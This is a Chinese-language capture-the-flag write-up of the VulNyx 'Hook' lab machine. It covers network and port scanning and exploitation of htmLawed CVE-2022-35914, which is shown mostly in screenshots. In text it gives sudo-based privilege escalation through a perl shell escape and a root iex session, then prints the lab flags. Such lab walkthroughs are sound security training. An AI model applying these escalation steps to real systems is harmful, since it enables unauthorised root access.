---
title: VulNyx Hook靶机复盘
author: LingMj
data: 2025-01-20
categories: [VulNyx]
tags: [htmlawed,CVE-2022-35914,iex]
description: 难度-Easy
---

## 网段扫描
```
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.26.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.26.1    00:50:56:c0:00:08       VMware, Inc.
192.168.26.2    00:50:56:e8:d4:e1       VMware, Inc.
192.168.26.184  00:0c:29:3c:f5:ac       VMware, Inc.
192.168.26.254  00:50:56:e8:96:d1       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.555 seconds (100.20 hosts/sec). 4 responde
```

## 端口扫描

```
└─# nmap -p- -sC -sV 192.168.26.184       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 23:10 EST
Nmap scan report for 192.168.26.184 (192.168.26.184)
Host is up (0.0013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/htmLawed
|_http-title: Apache2 Debian Default Page: It works
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|_  nodes: 
MAC Address: 00:0C:29:3C:F5:AC (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.34 seconds
```

## 获取Webshell

![图 0](../assets/images/c440f5c3d3086885c5495b9de8c948092bc63398a54e6dc283ffdb2a85a7715a.png)  

>貌似是cookie注入rce
>
![图 1](../assets/images/31ce02b5b06308c378f4ff8157371930c5514e7641a020b1d405d644c9047b78.png)  
![图 2](../assets/images/df347d3d4a4b2e66608a94460f73a9e6c4c15291b150f39e7c34f313c5cbfd19.png)  
![图 3](../assets/images/ef9f9c1a3e52411593b26813c6cf35f2d1ce0bdcafa8886d9d63f942f04a686b.png)  

>web就一个apache，这个注入感觉是关键了，erl工具按一下
>
![图 4](../assets/images/5c9a1f4de5c1ac4c423091f2a3aee134a50e6134a7e9049acf35c87603188271.png)  

>可以试试msf
>
![图 5](../assets/images/e1ded70b7279d07beaa0babb6e21511b291379b6f218e880eeb1b4cbaa81c718.png)  
![图 6](../assets/images/ca63b58a99b9fe2180926ae48d9cd6bbdbf9b49870d1a051229cc05cce736478.png)  

>算了，端口都不对，打web吧，不理解
>
![图 7](../assets/images/69a3c56517a77dc6e22d26e76ea4040e6493873c1542f1b12c2c42318d6a3ba0.png)  

>存在版本漏洞
>
![图 8](../assets/images/0755ab47a78c7c904fb69949f04d10576e784021f0f150dac1a6b8490aba8199.png)  
![图 9](../assets/images/3b44c50afb18481fe61c72e5d2e204a9277ea29eae7cb560c7cfd69b69ca5d4d.png)  
![图 10](../assets/images/befb089aa824352977347f15ac41dce8c30b414d7242a9aa4f87b921c8fb8ed7.png)  

>不是为啥直接没查到
>
![图 11](../assets/images/87ac3385145526ddcfbdaced853a2f57e352ae9d9f51342e6c804267181d0ab5.png)  

>直接利用那shell
>
![图 12](../assets/images/cfa0ddb71aa850baa1af2e9019762ec8e7609e4e5c76bb15beaf3e40af6cc39d.png)  
![图 13](../assets/images/3917d27587c4e7c09fcac87ca3cc02b685b4d5420d51ca847a55d4407afd3d02.png)  
![图 14](../assets/images/d4577e935d7af3f368d4757f088de995ad55abbd5132dc050fc0d5ba7c4904b1.png)  

>看看这个cve的介绍，好像路径是这个
>

![图 15](../assets/images/fec4f8a0e44dc886c3de5d277fd03e4a46b18d8dd19dc3ebff98d1f6dbf1f222.png)  
![图 16](../assets/images/1cae67a86e50d01f2cf90e2bc3d7c54cd5c9ec5f7cf99644df09d11b3be0ee44.png)  
![图 17](../assets/images/c06b7c9a4dc0ae44c43135d9c80663ba4acd37fe4846af6686a87687412633de.png)  
![图 18](../assets/images/6af49a0966f0133c2a9a69b115b572f8b68a653cd28adb0de0b34ecdec9df139.png)  
![图 19](../assets/images/447fd067e922c16151ab7599c9a44a75164543bc51a441d8580dd2452fd43bab.png)  
![图 20](../assets/images/a8300cd08f462a54c85da48ce2728b757f147f3e9830b72b92ec991256f11d39.png)  

>好奇怪
>
![图 21](../assets/images/e75aaf966b392a07948efff3cdab7127330be92dea42b1c8152a527607afd9d0.png)  

>手工注入吧，地址链接：https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/
>
![图 22](../assets/images/fe19a2ea0f507787fa52ed9bfa26ae01ce3cf7c7230291148793a7d9e8cf8fef.png)  
![图 23](../assets/images/85a85e086bdf112cffd32590af28f0c51c0348053fdfa5625e9d060571da9eed.png)  
![图 24](../assets/images/3a2fa87528c7d4e8a4087aa3e5bde723ff651f9fdf75a98a64136e434cd48ce5.png)  
![图 25](../assets/images/50ee55a1ce43cf121f9d4d7d1e6f14c60b42c0d8815abc1b5553f9cbcbe12381.png)  
![图 26](../assets/images/5587e14046aa9df648d69692c2686798f4332a9a776dab71908f3fb59602f384.png)  
![图 27](../assets/images/63a5e17a47d28f374fe95395ce746a048d5a86478cbc271f7e0dca9147ebbfaa.png)  

>用wget可以实现
>

## 提权
```
www-data@hook:/var/www/html/htmLawed$ sudo -l
Matching Defaults entries for www-data on hook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on hook:
    (noname) NOPASSWD: /usr/bin/perl
```
![图 28](../assets/images/932246dd940cc9cf30f39b151883a6449a941bd31d6853627d68a5fd0273fc4b.png)  
```
www-data@hook:/var/www/html/htmLawed$ sudo -u noname perl -e 'exec "/bin/sh";' 
$ bash
noname@hook:/var/www/html/htmLawed$ cd
noname@hook:~$ sudo -l
Matching Defaults entries for noname on hook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User noname may run the following commands on hook:
    (root) NOPASSWD: /usr/bin/iex
noname@hook:~$ 
```
```
noname@hook:~$ iex -h  
Usage: iex [options] [.exs file] [data]

The following options are exclusive to IEx:

  --dot-iex "FILE"    Evaluates FILE, line by line, to set up IEx' environment.
                      Defaults to evaluating .iex.exs or ~/.iex.exs, if any exists.
                      If FILE is empty, then no file will be loaded.
  --remsh NAME        Connects to a node using a remote shell.
  --no-pry            Doesn't start pry sessions when dbg/2 is called.

It accepts all other options listed by "elixir --help".
```
![图 29](../assets/images/20386abeac3e730abc117f485a81920603b056673abdc7412b5e5eac6d59331c.png)  

```
noname@hook:~$ sudo /usr/bin/iex
Erlang/OTP 25 [erts-13.1.5] [source] [64-bit] [smp:1:1] [ds:1:1:10] [async-threads:1] [jit:ns]

Interactive Elixir (1.14.0) - press Ctrl+C to exit (type h() ENTER for help)
iex(1)> help
warning: variable "help" does not exist and is being expanded to "help()", please use parentheses to remove the ambiguity or change the variable name
  iex:1

** (CompileError) iex:1: undefined function help/0 (there is no such import)

iex(1)> help()
** (CompileError) iex:1: undefined function help/0 (there is no such import)

iex(1)> h()   

                                  IEx.Helpers                                   

Welcome to Interactive Elixir. You are currently seeing the documentation for
the module IEx.Helpers which provides many helpers to make Elixir's shell more
joyful to work with.

This message was triggered by invoking the helper h(), usually referred to as
h/0 (since it expects 0 arguments).

You can use the h/1 function to invoke the documentation for any Elixir module
or function:

    iex> h(Enum)
    iex> h(Enum.map)
    iex> h(Enum.reverse/1)

You can also use the i/1 function to introspect any value you have in the
shell:

    iex> i("hello")

There are many other helpers available, here are some examples:

  • b/1            - prints callbacks info and docs for a given module
  • c/1            - compiles a file
  • c/2            - compiles a file and writes bytecode to the given path
  • cd/1           - changes the current directory
  • clear/0        - clears the screen
  • exports/1      - shows all exports (functions + macros) in a module
  • flush/0        - flushes all messages sent to the shell
  • h/0            - prints this help message
  • h/1            - prints help for the given module, function or macro
  • i/0            - prints information about the last value
  • i/1            - prints information about the given term
  • ls/0           - lists the contents of the current directory
  • ls/1           - lists the contents of the specified directory
  • open/1         - opens the source for the given module or function in
    your editor
  • pid/1          - creates a PID from a string
  • pid/3          - creates a PID with the 3 integer arguments passed
  • port/1         - creates a port from a string
  • port/2         - creates a port with the 2 non-negative integers passed
  • pwd/0          - prints the current working directory
  • r/1            - recompiles the given module's source file
  • recompile/0    - recompiles the current project
  • ref/1          - creates a reference from a string
  • ref/4          - creates a reference with the 4 integer arguments
    passed
  • runtime_info/0 - prints runtime info (versions, memory usage, stats)
  • t/1            - prints the types for the given module or function
  • v/0            - retrieves the last value from the history
  • v/1            - retrieves the nth value from the history

Help for all of those functions can be consulted directly from the command line
using the h/1 helper itself. Try:

    iex> h(v/0)

To list all IEx helpers available, which is effectively all exports (functions
and macros) in the IEx.Helpers module:

    iex> exports(IEx.Helpers)

This module also includes helpers for debugging purposes, see IEx.break!/4 for
more information.

To learn more about IEx as a whole, type h(IEx).

iex(2)> 
```
![图 30](../assets/images/bf51f0a8e421f05fa7474a260e85e86146f5f60b45cf2e5f674ddb0ec9bdedeb.png) 
![图 33](../assets/images/74bd6dfd94c779247f76cb4cf47b84ac51ed8c884948eee6fc0c4a89e8f9cfb2.png)  

![图 31](../assets/images/b0a30cdf17b0355e2d3cd9270fd65e13727ba89a756ac45854f9234831c261b9.png)  
![图 32](../assets/images/8b8059ee863a2bd3e22a0285e02f6980fb792407b074348ae825b9ee226a1e51.png)  

>可以进行命令注入
>
![图 34](../assets/images/1df02cf948dec5514757a8f4bc1fc7cdc691287bc52eb6f58a75303af7484f17.png)  

![图 35](../assets/images/97343707870fdc45a3eaf738bfc33c4f3af0c1fbcc58ad8f858b230c1cb690b3.png)  

>好了结束
>
>userflag:2ee7e8d7f8f2b515c0bdf19d5ce85e17
>
>rootflag:708883f44e1b0e57c8a501e176fad8a9
















